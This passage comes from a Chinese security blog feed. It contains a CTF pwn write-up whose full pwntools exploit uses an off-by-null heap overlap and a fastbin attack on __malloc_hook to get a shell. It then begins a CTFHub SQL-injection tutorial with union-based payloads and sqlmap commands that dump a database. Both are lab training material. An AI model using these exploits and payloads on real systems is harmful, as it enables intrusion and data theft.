<p>本题泄露利用<code>unsorted bin</code>中保存的<code>libc</code>地址与<code>libc</code>基址的固定偏移获取<code>libc</code>基址。因为结构体在初始化时并未初始化<code>ErrMsg</code>的值，并且其大小为<code>0x90</code>，我们申请一个结构体再将其释放，再次申请时可将其从<code>unsorted bin</code>中申请出来，然后可以通过打印函数打印<code>unsorted bin</code>中的内容。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911185916169.png"
                      alt="image-20230911185916169"
                ></p>
<p>在打印前下断点可以看到，此时<code>ErrMsg</code>中保存的值为<code>libc</code>地址。由于<code>libc</code>中的地址固定偏移不受<code>pie</code>和<code>aslr</code>保护影响，可以由此计算出<code>libc</code>基址。</p>
<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>);</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br></pre></td></tr></table></figure></div>

<p>堆地址也可以通过<code>unsorted bin</code>的<code>bk</code>指针泄露，我们将两个不连续的<code>non-fast</code>大小的堆块放入<code>unsorted bin</code>中，由于<code>unsorted bin</code>采取先进先出模式，所以我们会将<code>结构体1</code>重新申请出来，它<code>ErrMsg</code>的<code>bk</code>位置便是<code>结构体3</code>的地址。然后通过改名函数将<code>ErrMsg</code>的前八个字节覆盖满，然后便可通过打印函数将堆地址泄露。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911191326440.png"
                      alt="image-20230911191326440"
                ></p>
<p>同样在打印前下一个断点，可以看到其<code>bk</code>位置为一个堆地址。</p>
<h3 id="通过修改-malloc-hook为one-gadget地址get-shell"><a href="#通过修改-malloc-hook为one-gadget地址get-shell" class="headerlink" title="通过修改__malloc_hook为one_gadget地址get_shell"></a>通过修改__malloc_hook为one_gadget地址get_shell</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></div>

<p>因为<code>Add</code>函数存在<code>off-by-null</code>漏洞，所以我们可以制造一个堆块重叠，将一个<code>fast chunk</code>包含在其中，这里需要注意的时，我们要绕过<code>unlink</code>检查，需要将伪造的<code>fake chunk</code>的<code>fd</code>和<code>bk</code>指向它本身。然后计算好偏移将<code>fast chunk</code>的<code>fd</code>位置改为<code>__malloc_hook</code>附近包含<code>__malloc_hook</code>大小的<code>fake chunk</code>的位置。然后将<code>__malloc_hook</code>改为<code>one_gadget</code>。此时四个<code>one_gadget</code>都无法打通，我们可以<code>free</code>一个错误的<code>chunk</code>来调用<code>malloc_printerr</code>函数，这个函数中存在其他的调用，最后会调用到<code>malloc</code>，然后便可调用<code>one_gadget</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193221372.png"
                      alt="image-20230911193221372"
                ></p>
<p>通过<code>find_fake_fast</code>来寻找<code>__malloc_hook</code>附近的<code>fake_chunk</code>。<code>fake_chunk</code>的<code>prev_size</code>距离<code>__malloc_hook</code>有0x23大小。所以填充<code>0x13</code>字节即可覆盖到目标地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193629573.png"
                      alt="image-20230911193629573"
                ></p>
<p>我们可以通过<code>k</code>来查看函数调用栈，发现<code>free</code>报错后会在动态链接器调用<code>malloc</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911194307830.png"
                      alt="image-20230911194307830"
                ></p>
<p>可以在源码中发现，由于<code>free</code>一个错误堆块调用了<code>malloc_printerr</code>函数，最后在<code>dl-error.c</code>调用了<code>malloc</code>函数。</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_debug = <span class="literal">False</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Delete(<span class="number">0</span>) <span class="comment"># errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 # unsorted-&gt;errmsg_0x90</span></span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db1</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	<span class="comment">#debug() # db2</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db3</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4 first 0x71</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	<span class="comment">#debug() # db4</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db5</span></span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6 off-by-null</span></span><br><span class="line">	<span class="comment">#debug() # db6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db7</span></span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	<span class="comment">#debug() # db8</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p, &#x27;b *_dl_signal_error&#x27;)</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	connect()</span><br><span class="line">	get_libc()</span><br><span class="line">	get_heap()</span><br><span class="line">	get_shell()</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn题解</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-SQL_injection</title>
    <url>/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要学一下IOT安全，但我web方面还是个小白，所以有了二进制选手的web安全之路这个系列。我打算把每天学的web安全以及渗透相关的知识积累起来，每篇文章作为一个专题，后续如果发现了这个专题的其他内容，也会补充这些新内容。本着开源精神，利己利他，后续有和我一样的同学也能少走些弯路。</p>
<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><p>靶场环境 ：<strong>ctfhub技能数-&gt;web-&gt;sql注入</strong><br>注入参数为整数类型，语句类似 <strong>select * from news where id&#x3D;参数</strong>。</p>
<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="手动解法"><a href="#手动解法" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以根据回显结果来判断我们插入的语句是否被解析为 sql 语法，是否存在整数注入。</li>
</ol>
<ul>
<li>有回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916260_65065ea4ef5f74197d22d.jpeg"
                      alt="图片.png"
                ></li>
<li>无回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916280_65065eb84cc85d0f84691.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>确认查询列数。输入到 3 时返回错误，所以列数为 2 。</li>
</ol>
<ul>
<li>输入<code>1 order by 1</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916304_65065ed0c6d83b7476271.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916380_65065f1ce90b56a129953.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 3</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916437_65065f554ccda7aa2c70c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="3">
<li>通过<code>union</code>注入查询数据。<a class="link"   href="https://blog.csdn.net/qq_33704186/article/details/81909276#:~:text=1%20UNION%E5%BF%85%E9%A1%BB%E7%94%B1%E4%B8%A4%E6%9D%A1%E4%BB%A5%E4%B8%8A%E7%9A%84SELECT%E8%AF%AD%E5%8F%A5%E7%BB%84%E6%88%90%EF%BC%8C%E8%AF%AD%E5%8F%A5%E4%B9%8B%E9%97%B4%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97UNION%E5%88%86%E5%89%B2%E3%80%82%202%20UNION%E4%B8%AD%E7%9A%84%E6%AF%8F%E4%B8%AA%E6%9F%A5%E8%AF%A2%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E5%88%97%E3%80%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%88%96%E8%81%9A%E9%9B%86%E5%87%BD%E6%95%B0%EF%BC%88%E5%90%84%E4%B8%AA%E5%88%97%E4%B8%8D%E9%9C%80%E8%A6%81%E4%BB%A5%E7%9B%B8%E5%90%8C%E7%9A%84%E6%AC%A1%E5%BA%8F%E5%88%97%E5%87%BA%EF%BC%89%E3%80%82,3%20%E5%88%97%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%BF%85%E9%A1%BB%E5%85%BC%E5%AE%B9%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%B8%8D%E5%BF%85%E5%AE%8C%E5%85%A8%E7%9B%B8%E5%90%8C%EF%BC%8C%E4%BD%86%E5%BF%85%E9%A1%BB%E6%98%AFDBMS%E5%8F%AF%E4%BB%A5%E9%9A%90%E5%90%AB%E5%9C%B0%E8%BD%AC%E6%8D%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E3%80%82%204%20%E5%A6%82%E6%9E%9C%E5%8F%96%E5%87%BA%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E9%9C%80%E8%A6%81%E5%8E%BB%E9%87%8D%EF%BC%8C%E4%BD%BF%E7%94%A8UNION%20ALL%E3%80%82" >union 联合查询 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>语句内部每个 select 语句必须拥有相同的列。<code>union</code>也可用于查询列数。</li>
</ol>
<ul>
<li>输入<code>union select 1</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916765_6506609dab540b6023728.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>union select 1,2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916821_650660d546a90eeed092e.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="4">
<li>利用<code>union</code>查询数据库名。</li>
</ol>
<ul>
<li>输入<code>-1 union select 1,database()</code>。让<code>id=-1</code>因为回显只有一行数据，需要让第一个 select 语句返回空。这里查询到一个<code>sqli</code>数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917239_650662772b8e7111dc06f.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code>。Mysql5.0以上版本中<code>information_schema</code>默认库保存了所有数据库信息。这里我们查询到了一个<code>flag</code>表。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917671_650664275ef10bfc36caa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;</code>。通过<code>group_concat()</code>函数将多条数据组合成字符串输出，或者通过<code>limit</code>函数选择输出第几条数据。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918028_6506658c3aaaad01f227a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918269_6506667d5ea3ec2a0c007.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39;</code>，同样通过<code>information_schema</code>查询列名。flag 表中 只有一个 flag 列。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918728_65066848ed5194e1132da.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(flag) from sqli.flag</code>。直接查询 flag 列中数据即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918968_650669383b276fdeff2c2.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法"><a href="#sqlmap解法" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 --tables</code>。<code>-u</code>指定<code>url</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925726_6506839ed41f7be2b056e.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925791_650683dfc0312ff3118a9.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</code>。<code>-D</code>指定数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925898_6506844a0ba4ae76ab779.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925919_6506845fcf0c913dbdef5.jpeg"
                      alt="图片.png"
                ></li>
